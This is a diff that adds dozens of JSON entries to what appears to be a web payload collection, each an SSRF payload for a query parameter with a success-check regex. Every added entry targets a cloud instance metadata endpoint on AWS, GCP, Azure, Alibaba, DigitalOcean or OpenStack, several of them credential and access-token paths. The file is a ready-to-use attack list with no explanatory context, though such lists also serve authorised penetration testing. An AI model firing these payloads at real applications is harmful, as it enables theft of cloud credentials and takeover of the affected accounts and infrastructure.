@@ -801,5 +801,489 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-55900",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55901",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/user-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55902",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55903",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55904",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/hostname",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55905",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/instance-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55906",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/public-ipv4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55907",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/local-ipv4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55908",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55909",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55910",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/profile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55911",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/dynamic/instance-identity/document",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55912",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/dynamic/instance-identity/signature",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55913",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55914",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/api/token",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55915",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55916",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55917",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55918",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55919",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55920",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/zone",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55921",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55922",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/disks/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55923",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.googleapis.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55924",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55925",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55926",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55927",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55928",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55929",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55930",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/instance-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55931",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/region-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55932",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/zone-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55933",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/user-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55934",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55935",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55936",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/hostname",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55937",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/region",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55938",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/user-data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55939",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/openstack/latest/meta_data.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55940",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/openstack/latest/user_data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55941",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/openstack/latest/network_data.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55942",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/instance?",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
+  },
+  {
+    "payload_id": "OWP-55943",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/keys?",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "169.254|metadata"
+    }
   }
 ]
